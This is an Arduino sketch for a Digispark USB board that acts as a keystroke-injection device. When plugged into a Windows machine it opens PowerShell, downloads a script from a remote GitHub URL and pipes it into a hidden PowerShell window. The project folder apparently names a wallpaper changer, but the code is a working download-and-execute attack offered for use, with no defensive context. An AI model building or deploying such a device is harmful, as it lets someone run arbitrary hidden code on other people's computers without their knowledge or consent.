
// must have http://digistump.com/package_digistump_index.json in board manager urls in arduino ide
// add board via tools > board manager > contributed > digispark
// select baord with tools > board > digistump avr ... > digispark
#include <DigiKeyboard.h>
void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("PowerShell.exe");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("$Response = Invoke-WebRequest https://raw.githubusercontent.com/vmorganp/digispark/master/wallpaper_changer/remote_script.ps1");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.print("echo $Response.Content | PowerShell.exe -windowstyle hidden");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
